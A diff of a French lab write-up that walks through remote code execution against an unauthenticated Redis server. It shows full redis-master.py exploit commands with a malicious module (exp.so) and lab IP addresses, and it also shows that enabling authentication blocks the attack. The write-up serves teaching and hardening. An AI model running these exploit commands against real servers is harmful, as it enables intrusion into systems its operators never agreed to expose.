@@ -21,7 +21,7 @@ sudo docker-compose up -d
 ### Vérification du fonctionnement
 Nous vérifions que le serveur est accessible sans restriction.
 ```
-redis-cli -h ip-du-serveur
+redis-cli -h 192.168.125.128
 ```
 Cela devrait retourner l'invite de commande redis.
 
@@ -68,12 +68,12 @@ Nous lançons le script Python en définissant l'IP de la victime (-r) et notre 
 
 Test 1 : Obtention de l'identité (Preuve RCE)
 ```
-python3 redis-master.py -r <ip-victime> -p 6379 -L <ip-attaquant> -P 8888 -f RedisModulesSDK/exp.so -c "id"
+python3 redis-master.py -r 192.168.125.128 -p 6379 -L 192.168.125.130 -P 8888 -f RedisModulesSDK/exp.so -c "id"
 ```
 
 Test 2 : Création de fichier (Preuve de persistance)
 ```
-python3 redis-master.py -r <ip-victime> -p 6379 -L <ip-attaquant> -P 8888 -f RedisModulesSDK/exp.so -c "touch /tmp/PreuveDeHack"
+python3 redis-master.py -r 192.168.125.128 -p 6379 -L 192.168.125.130 -P 8888 -f RedisModulesSDK/exp.so -c "touch /tmp/PreuveDeHack"
 ```
 On peut ensuite vérifier sur la victime que le fichier /tmp/PreuveDeHack existe.
 ```
@@ -142,7 +142,7 @@ edis-cli -h 192.168.125.128
 ### Échec du script d'attaque
 Nous relançons le script d'exploitation. Celui-ci échoue désormais car il ne peut plus s'authentifier pour envoyer les commandes de configuration.
 ```
-python3 redis-master.py -r 192.168.125.128 -p 6379 -L 192.168.125.129 -P 8888 -f RedisModulesSDK/exp.so -c "id"
+python3 redis-master.py -r 192.168.125.128 -p 6379 -L 192.168.125.130 -P 8888 -f RedisModulesSDK/exp.so -c "id"
 ```
 Sortie observée : 
 ```
